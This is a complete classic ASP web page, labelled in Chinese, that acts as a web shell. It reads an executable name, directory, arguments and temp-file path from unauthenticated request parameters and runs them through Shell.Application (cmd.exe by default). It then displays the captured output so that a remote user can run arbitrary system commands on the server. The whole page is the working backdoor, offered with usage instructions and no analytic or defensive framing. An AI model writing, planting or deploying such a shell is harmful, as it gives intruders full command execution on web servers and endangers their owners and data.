<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>调用Shell.Application执行DOS命令</title>
</head>
<body>
<%
Dim appPath, appName, appArgs,command,tempfile
appPath = Trim(Request("appPath"))
appName = Trim(Request("appName"))
appArgs = Trim(Request("appArgs"))
tempfile = Trim(Request("tempfile"))

command = "/c"  & appArgs & ">" & tempfile
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute appName, command, appPath, "open", 0
%>
<h4>Shell.Application组件执行命令</h4>
result:<br/>
<textarea rows="30" cols="150">
<%
dim file,read,content
set file=Server.CreateObject("Scripting.FileSystemObject") 
If file.FileExists(tempfile) Then
	set read=file.OpenTextFile(tempfile,1,false)
	content=read.ReadAll
	read.close
	Response.Write(content )
end if
%>
</textarea><hr />
<form action="" method="post">
可执行文件所在目录：<input type="text" name="appPath" value="C:\Windows\System32\"/>
可执行文件的文件名：<input type="text" name="appName" value="cmd.exe" />
临时文件：<input type="text" name="tempfile" value="C:\temptext.txt" /><br /><br />
command：<input type="text" name="appArgs" value="" style="width:502px"/>
<input type="submit" value="submit"/>
<input type="submit" value="look result"/>
</form>
说明:submit后,再点击look result查看命令返回的结果.
</body>
</html>
